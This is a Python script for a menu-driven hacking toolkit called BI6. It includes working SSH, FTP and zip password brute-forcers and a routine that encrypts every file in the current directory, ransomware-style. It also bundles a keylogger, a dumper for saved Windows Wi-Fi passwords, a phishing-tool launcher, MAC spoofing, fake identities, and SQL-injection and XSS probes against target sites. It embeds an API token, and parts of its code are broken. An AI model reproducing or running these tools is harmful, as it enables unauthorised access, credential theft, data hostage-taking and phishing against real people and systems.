#!/usr/bin/python

#if the above code doesn't work go to your terminal and run: which python then, replace `/usr/bin/python` with the python path



import os
import zipfile
import tqdm
import time
import socket
import phonenumbers
from phonenumbers import geocoder, carrier, timezone
import nmap
from faker import Faker
from faker.providers import internet
from cryptography.fernet import Fernet
import subprocess
import ipinfo
from bs4 import BeautifulSoup as bs
import requests
import sys
from urllib.parse import urljoin, urlparse
from pprint import pprint
import codecs
import subprocess
import string
import random
import re
import ftplib
from threading import Thread
from queue import Queue
from colorama import Fore, init
from pynput import keyboard
import paramiko
import dns.resolver
from datetime import timezone, datetime, timedelta
from threading import Thread, Lock

def bi6():
    init()
    GREEN = Fore.GREEN
    RESET = Fore.RESET
    RED = Fore.RED
    GRAY = Fore.LIGHTBLACK_EX
    
    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"
        

    print('Welcome to BI6')
    
    def crackSSH():
        init()
        GREEN = Fore.GREEN
        RED   = Fore.RED
        RESET = Fore.RESET
        BLUE  = Fore.BLUE
        wordlist = input('Path to wordlist : ')
        hostname = input('Host : ')
        username = input('username : ')
        usrport = int(input('Port : '))
        passwords = codecs.open(wordlist, 'r', encoding='utf-8', errors='ignore').read().split("\n")
        def is_ssh_open():
            
            
            
            
        # initialize SSH client
            client = paramiko.SSHClient()
            # add to know hosts
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(hostname=hostname, port=usrport , username=username, password=password, timeout=3)
            except socket.timeout:
                print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
                return False
                    
            except paramiko.AuthenticationException:
                print(f"[!] Invalid credentials for {username}:{password}")
                return False
            except paramiko.SSHException:
                print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
                # sleep for a minute
                time.sleep(60)
                return is_ssh_open()
            else:
                # connection was established successfully
                print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
                return True
        for password in passwords:
            if is_ssh_open():
            # if combo is valid, save it to a file
                open("credentials.txt", "w").write(f"{username}@{hostname}:{password}")
                break
    def crackFtp():
        global q
        q = Queue()
        # number of threads to spawn
        n_threads = 30
        # hostname or IP address of the FTP server
        host = input('FTP Server Address : ')
        # username of the FTP server, root as default for linux
        user = input('username : ')
        # port of FTP, aka 21
        port = int(input('Port : '))

        def connect_ftp():
            wordlist = input('Path to wordlist : ')
        
            while True:
                # get the password from the queue
                password = q.get()
                # initialize the FTP server object
                server = ftplib.FTP()
                print("[!] Trying", password)
                try:
                    # tries to connect to FTP server with a timeout of 5
                    server.connect(host, port, timeout=5)
                    # login using the credentials (user & password)
                    server.login(user, password)
                except ftplib.error_perm:
                    # login failed, wrong credentials
                    pass
                else:
                    # correct credentials
                    print(f"{Fore.GREEN}[+] Found credentials: ")
                    print(f"\tHost: {host}")
                    print(f"\tUser: {user}")
                    print(f"\tPassword: {password}{Fore.RESET}")
                    # we found the password, let's clear the queue
                    with q.mutex:
                        q.queue.clear()
                        q.all_tasks_done.notify_all()
                        q.unfinished_tasks = 0
                finally:
                    # notify the queue that the task is completed for this password
                    q.task_done()

                # read the wordlist of passwords
                passwords = open(wordlist).read().split("\n")
                print("[+] Passwords to try:", len(passwords))
                # put all passwords to the queue
                for password in passwords:
                    q.put(password)
                # create `n_threads` that runs that function
                for t in range(n_threads):
                    thread = Thread(target=connect_ftp)
                    # will end when the main thread end
                    thread.daemon = True
                    thread.start()
                # wait for the queue to be empty
                q.join()
    
    def crackZip():
        wordlist = input('Path to wordlist : ')
        # the password list path you want to use, must be available in the current directory
        
        # the zip file you want to crack its password
        zip_file = input('Zip Name ')
        # initialize the Zip File object
        zip_file = zipfile.ZipFile(zip_file + '.zip')
        # count the number of words in this wordlist
        n_words = len(list(open(wordlist, "rb")))
        passwords = codecs.open(wordlist, 'r', encoding='utf-8', errors='ignore')
        
        # print the total number of passwords
        print("Total passwords to test:", n_words)
        for password in passwords:
            try:
                zip_file.extractall(pwd=password)
            except:
                print(f'[!] Wrong password: {password}')
                pass
                
                    
            else:
                print(f"[+] Password found: {password}")
                exit(0)
            
        
            
    
    
    def lockFiles():
        files = []
        prompt = ""
        for file in os.listdir():
            
            if file == 'main.py' or file == 'thekey.key':
                continue
            if os.path.isfile(file): 
                files.append(file)
                
        print('Locked.')
        print(prompt)
        print(files)
        
        key = Fernet.generate_key()
        with open('thekey.key', 'wb') as thekey:
            thekey.write(key)
        for file in files:
            with open(file, 'rb') as thefile:
                contents = thefile.read()
                contents_encrypted = Fernet(key).encrypt(contents)
            with open(file, 'wb') as thefile:
                thefile.write(contents_encrypted)
                
    def unlockFiles():
        files = []
        for file in os.listdir():
            
            if file == 'main.py' or file == 'thekey.key':
                continue
            if os.path.isfile(file): 
                files.append(file)
                
        print('Unlocked.')
        print(files)
        with open('theKey.key', 'rb') as key:
            secretKey = key.read()
        for file in files:
            with open(file, 'rb') as thefile:
                contents = thefile.read()
                contents_decrypted = Fernet(secretKey).decrypt(contents)
            with open(file, 'wb') as thefile:
                thefile.write(contents_decrypted)
            
    def get_random_macos_address():
        """Generate and return a MAC address in the format of Linux"""
    # get the hexdigits uppercased
        uppercased_hexdigits = ''.join(set(string.hexdigits.upper()))
        # 2nd character must be 0, 2, 4, 6, 8, A, C, or E
        mac = ""
        for i in range(6):
            for j in range(2):
                if i == 0:
                    mac += random.choice("02468ACE")
                else:
                    mac += random.choice(uppercased_hexdigits)
            mac += ":"
        return mac.strip(":")

    def scanPorts():
        def is_port_open(host, port):
            """determine whether `host` has the `port` open"""
            # creates a new socket
            s = socket.socket()
            try:
                # tries to connect to host using that port
                s.connect((host, port))
                # make timeout if you want it a little faster ( less accuracy )
                s.settimeout(0.2)
            except:
                # cannot connect, port is closed
                # return false
                return False
            else:
                # the connection was established, port is open!
                return True

        # get the host from the user
        host = input("Enter the host:")
        # iterate over ports, from 1 to 1024
        for port in range(1, 1025):
            if is_port_open(host, port):
                print(f"{GREEN}[+] {host}:{port} is open      {RESET}")
            else:
                print(f"{GRAY}[!] {host}:{port} is closed    {RESET}", end="\r")
            
            
            
    def pyPhisher():
        os.system('pyphisher ')
        
    def keyLog():
        
        keys_list = []
        def key_pressed(key):
            try:
                keys_list.append(key)
                with open('keyLogs.txt', 'wb') as log:
                    log.write(key)
                    
            except:
                pass
        def key_released(key):
            if key == keyboard.Key.esc:
                pass
        
        with keyboard.Listener(on_press=key_pressed, on_release=key_released) as listener:
            listener.join()
            
    def domainDirectory():
        init()
        GRAY = Fore.LIGHTBLACK_EX
        RESET = Fore.RESET
        YELLOW = Fore.YELLOW

        # initialize the set of links (unique links)
        internal_urls = set()
        external_urls = set()

        total_urls_visited = 0


        def is_valid(url):
            """
            Checks whether `url` is a valid URL.
            """
            parsed = urlparse(url)
            return bool(parsed.netloc) and bool(parsed.scheme)


        def get_all_website_links(url):
            domain_name = ''
            """
            Returns all URLs that is found on `url` in which it belongs to the same website
            """
            # all URLs of `url`
            urls = set()
            soup = bs(requests.get(url).content, "html.parser")
            for a_tag in soup.findAll("a"):
                href = a_tag.attrs.get("href")
                if href == "" or href is None:
                    # href empty tag
                    continue
                # join the URL if it's relative (not absolute link)
                href = urljoin(url, href)
                parsed_href = urlparse(href)
                # remove URL GET parameters, URL fragments, etc.
                href = parsed_href.scheme + "://" + parsed_href.netloc + parsed_href.path
                if not is_valid(href):
                    # not a valid URL
                    continue
                if href in internal_urls:
                    # already in the set
                    continue
                if domain_name not in href:
                    # external link
                    if href not in external_urls:
                        print(f"{GRAY}[!] External link: {href}{RESET}")
                        external_urls.add(href)
                    continue
                print(f"{GREEN}[*] Internal link: {href}{RESET}")
                urls.add(href)
                internal_urls.add(href)
            return urls


        def crawl():
            url = input('URL : ')
            max_urls = int(input('Max URLs'))
            """
            Crawls a web page and extracts all links.
            You'll find all links in `external_urls` and `internal_urls` global set variables.
            params:
                max_urls (int): number of max urls to crawl, default is 30.
            """
            global total_urls_visited
            total_urls_visited += 1
            print(f"{YELLOW}[*] Crawling: {url}{RESET}")
            links = get_all_website_links(url)
            for link in links:
                if total_urls_visited > max_urls:
                    break
                crawl(link, max_urls=max_urls)
                            # href empty tag
                    
    def ping():
        target = input('Target: ')
        os.system(f'ping {target} ')
    def fakeMe():
        locale = input('locale: ')
        fake = Faker(locale)
        
        fake.add_provider(internet)
        print("Here's your new identity: ")
        print(f'name:' + fake.name())
        print(fake.ipv4_private())
        print(fake.address())
        
    def windowsWifi():
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        for i in profiles:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            try:
                print ("{:<30}|  {:<}".format(i, results[0]))
                with open('wifipassword.txt', 'wb') as wifitxt:
                    wifitxt.write(results)
            except :
                print ("{:<30}|  {:<}".format(i, ""))
    def getIpInfo():
        try:
            ip_address = sys.argv[1]
        except :
            ip_address = input('IP Address : ')
        # access token for ipinfo.io
        access_token = 'eb7743c01b91d8'
        # create a client object with the access token
        handler = ipinfo.getHandler(access_token)
        # get the ip info
        details = handler.getDetails(ip_address)
        # print the ip info
        for key, value in details.all.items():
            print(f"{key}: {value}")
            
    def get_current_macos_address(iface):
        # use the ifconfig command to get the interface details, including the MAC address
        output = subprocess.check_output(f"ifconfig {iface}", shell=True).decode()
        return re.search("ether (.+) ", output).group().split()[1].strip()
    def macos_spoofMac():
        mac = input('Preferred Mac Address: ')
        card = input('Network Card: ')
        os.system(f'brew install spoof-mac && sudo spoof-mac set {card} {mac}')
    
    def PhoneNumberInfo():
        phoneNumber = phonenumbers.parse(input('Target Phone Number : '))
        phoneDetails = geocoder.description_for_number(phoneNumber, 'en')
        serviceProvider = carrier.name_for_number(phoneNumber,'en')
        timezonee = timezone.time_zones_for_number(phoneNumber)
        isvalid = phonenumbers.is_valid_number(phoneNumber)
        print(phoneNumber)
        print(f'Description : {phoneDetails}')
        print(f'Carrier Name : {serviceProvider}')
        print(f'Timezone : {timezonee}')
        print(f'isValid : {isvalid}')
        
        print(f'{phoneDetails}, {serviceProvider}')
        
    def DnsEnumerator():
        target_domain = input('Target Domain : ')
        record_types = ["A", "AAAA", "CNAME", "MX", "NS", "SOA", "TXT"]
        resolver = dns.resolver.Resolver()
        for record_type in record_types:
        # Perform DNS lookup for the specified domain and record type
            try:
                answers = resolver.resolve(target_domain, record_type)
            except dns.resolver.NoAnswer:
                continue
            # Print the answers
            print(f"{record_type} records for {target_domain}:")
            for rdata in answers:
                print(f" {rdata}")
                
    def scanSqlInjections():
         
        def get_all_forms(url):
                """Given a `url`, it returns all forms from the HTML content"""
                soup = bs(s.get(url).content, "html.parser")
                return soup.find_all("form")


        def get_form_details(form):
                """
                This function extracts all possible useful information about an HTML `form`
                """
                details = {}
                # get the form action (target url)
                try:
                    action = form.attrs.get("action").lower()
                except:
                    action = None
                # get the form method (POST, GET, etc.)
                method = form.attrs.get("method", "get").lower()
                # get all the input details such as type and name
                inputs = []
                for input_tag in form.find_all("input"):
                    input_type = input_tag.attrs.get("type", "text")
                    input_name = input_tag.attrs.get("name")
                    input_value = input_tag.attrs.get("value", "")
                    inputs.append({"type": input_type, "name": input_name, "value": input_value})
                # put everything to the resulting dictionary
                details["action"] = action
                details["method"] = method
                details["inputs"] = inputs
                return details
        def is_vulnerable(response):
            """A simple boolean function that determines whether a page 
            is SQL Injection vulnerable from its `response`"""
            errors = {
                # MySQL
                "you have an error in your sql syntax;",
                "warning: mysql",
                # SQL Server
                "unclosed quotation mark after the character string",
                # Oracle
                "quoted string not properly terminated",
            }
            for error in errors:
                # if you find one of these errors, return True
                if error in response.content.decode().lower():
                    return True
            # no error detected
            return False
        
        
            # test on URL
        url = input('Target URL : ')
        try:
            for c in "\"'":
                # add quote/double quote character to the URL
                new_url = f"{url}{c}"
                print("[!] Trying", new_url)
                # make the HTTP request
                res = s.get(new_url)
                if is_vulnerable(res):
                    # SQL Injection detected on the URL itself, 
                    # no need to preceed for extracting forms and submitting them
                    print("[+] SQL Injection vulnerability detected, link:", new_url)
                    return
            # test on HTML forms
            forms = get_all_forms(url)
            print(f"[+] Detected {len(forms)} forms on {url}.")
            for form in forms:
                form_details = get_form_details(form)
                for c in "\"'":
                    # the data body we want to submit
                    data = {}
                    for input_tag in form_details["inputs"]:
                        if input_tag["type"] == "hidden" or input_tag["value"]:
                                # any input form that is hidden or has some value,
                                # just use it in the form body
                            try:
                                data[input_tag["name"]] = input_tag["value"] + c
                            except:
                                pass
                        elif input_tag["type"] != "submit":
                                # all others except submit, use some junk data with special character
                            data[input_tag["name"]] = f"test{c}"
                        # join the url with the action (form request URL)
                        url = urljoin(url, form_details["action"])
                        if form_details["method"] == "post":
                            res = s.post(url, data=data)
                        elif form_details["method"] == "get":
                            res = s.get(url, params=data)
                            # test whether the resulting page is vulnerable
                        if is_vulnerable(res):
                            print("[+] SQL Injection vulnerability detected, link:", url)
                            print("[+] Form:")
                            pprint(form_details)
                            return print('Site is Vulnerable')
                            
                        else:
                           return print('Site is not vulnerable')
                        
        except :
            print('An Error occured try using https instead')
    
    def scanXSS():
        def get_all_forms(url):
            """Given a `url`, it returns all forms from the HTML content"""
            soup = bs(requests.get(url).content, "html.parser")
            return soup.find_all("form")
        def get_form_details(form):
            """
            This function extracts all possible useful information about an HTML `form`
            """
            details = {}
            # get the form action (target url)
            action = form.attrs.get("action", "").lower()
            # get the form method (POST, GET, etc.)
            method = form.attrs.get("method", "get").lower()
            # get all the input details such as type and name
            inputs = []
            for input_tag in form.find_all("input"):
                input_type = input_tag.attrs.get("type", "text")
                input_name = input_tag.attrs.get("name")
                inputs.append({"type": input_type, "name": input_name})
            # put everything to the resulting dictionary
            details["action"] = action
            details["method"] = method
            details["inputs"] = inputs
            return details

        def submit_form(form_details, url, value):
            """
            Submits a form given in `form_details`
            Params:
                form_details (list): a dictionary that contain form information
                url (str): the original URL that contain that form
                value (str): this will be replaced to all text and search inputs
            Returns the HTTP Response after form submission
            """
            # construct the full URL (if the url provided in action is relative)
            target_url = urljoin(url, form_details["action"])
            # get the inputs
            inputs = form_details["inputs"]
            data = {}
            for input in inputs:
                # replace all text and search values with `value`
                if input["type"] == "text" or input["type"] == "search":
                    input["value"] = value
                input_name = input.get("name")
                input_value = input.get("value")
                if input_name and input_value:
                    # if input name and value are not None, 
                    # then add them to the data of form submission
                    data[input_name] = input_value

            print(f"[+] Submitting malicious payload to {target_url}")
            print(f"[+] Data: {data}")
            if form_details["method"] == "post":
                return requests.post(target_url, data=data)
            else:
                # GET request
                return requests.get(target_url, params=data)
            
        url = input('Target : ')
        """
        Given a `url`, it prints all XSS vulnerable forms and 
        returns True if any is vulnerable, False otherwise
        """
        # get all the forms from the URL
        forms = get_all_forms(url)
        print(f"[+] Detected {len(forms)} forms on {url}.")
        js_script = "<Script>alert('hi')</scripT>"
        # returning value
        is_vulnerable = False
        # iterate over all forms
        for form in forms:
            form_details = get_form_details(form)
            content = submit_form(form_details, url, js_script).content.decode()
            if js_script in content:
                print(f"[+] XSS Detected on {url}")
                print(f"[*] Form details:")
                pprint(form_details)
                is_vulnerable = True
                # won't break because we want to print available vulnerable forms
                return is_vulnerable, print('Site is Vulnerable')
            else:
                print('Site Is Not Vulnerable')
        
    
        

    command = input('what do you want to do? : ')
    
    if command == 'lock files':
        lockFiles()
    elif command == 'set mac address':
        macos_spoofMac()
    elif command == 'get web addresses':
        domainDirectory()
    elif command == 'dns enum':
        DnsEnumerator()
    elif command == 'scan sql inject':
        scanSqlInjections()
    elif command == 'scan xss':
        scanXSS()
    elif command == 'get mac address':
        get_current_macos_address()
    elif command == 'unlock files':
        unlockFiles()
    elif command == 'scan ports':
        scanPorts()
    elif command == 'pyPhisher':
        pyPhisher()
    elif command == 'log keys':
        keyLog()
    
    elif command == 'phone info':
        PhoneNumberInfo()
    elif command == 'ping':
        ping()
    elif command == 'crack ssh':
        crackSSH()
    elif command == 'fake identity':
        fakeMe()
    elif command == 'win wifi':
        windowsWifi()
    elif command == 'get ip info':
        getIpInfo()
    elif command == 'randomize mac':
        get_random_macos_address()
    elif command == 'crack zip':
        crackZip()
    elif command == 'crack ftp':
        crackFtp()
    elif command == 'help':
        print(''''lock files' : Lock all files in the current directory
    'set mac address' : Set MacOS Mac address
    'subdomain scan' : Scans For SubDomains
    'scan xss' : Scans sites for XSS Vulnerability
    'get web addresses' : Scans Sites for Directories eg: example.com/page
    'crack zip' : BruteForce Zip file
    'scan sql inject' : Scans Sites For Sql Injection Vulnerability
    'phone info' : Gathers Information about a phone Number
    'crack ssh' : BruteForce SSH
    'crack ftp' : Bruteforce Ftp server
    'unlock files' : Unlock locked files
    'scan ports' : Scan Ports
    'dns enum' : Run A DNS Enumeration
    'pyPhisher' : Launch PyPhisher
    'log keys' : Key logger
    'ping' : Ping addresses
    'fake identity' : Creates a fake identity
    'win wifi' : get windows Wifi passwords
    'get ip info' : Get information on public IP Addresses
    'randomize mac' : randomize macos mac address''')
        bi6()
    else:
        print('Command Not found')
        bi6()
        
bi6()  
